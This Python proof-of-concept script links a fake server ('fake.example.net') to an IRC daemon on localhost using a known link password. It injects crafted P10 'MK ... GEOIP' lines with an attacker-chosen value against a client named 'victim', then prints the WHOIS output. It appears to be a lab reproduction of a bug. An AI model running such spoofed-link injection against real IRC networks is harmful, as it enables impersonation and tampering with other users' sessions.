import socket,time,sys
cont=sys.argv[1] if len(sys.argv)>1 else "ZZ"
s=socket.create_connection(("127.0.0.1",17700))
c=socket.create_connection(("127.0.0.1",17701))
def tx(sock,l): sock.sendall((l+"\r\n").encode())
tx(c,"NICK victim"); tx(c,"USER v 0 * :v")
time.sleep(1.5)
now=int(time.time())
tx(s,"PASS :pw")
tx(s,f"SERVER fake.example.net 1 {now} {now} J10 AB]]] +hs6 :fake")
buf=b""; end=time.time()+5
while time.time()<end:
  s.settimeout(0.5)
  try: d=s.recv(4096)
  except socket.timeout: continue
  if not d: break
  buf+=d
  if b" EB" in buf: break
print("SRV:",buf.decode(errors="replace")[:1500])
tx(s,f"AB N fakeuser 1 {now} u h.example +i B]AAAB ABAAA :fake")
tx(s,"AB EB"); tx(s,"AB EA")
time.sleep(1)
tx(s,f"AB MK victim GEOIP XX {cont}")
tx(s,f"AB MK fakeuser GEOIP XX {cont} :Nowhere")
time.sleep(1)
tx(c,"WHOIS victim")
time.sleep(1)
c.settimeout(1)
try: print(c.recv(65536).decode(errors="replace")[-1500:])
except Exception as e: print("client recv",e)
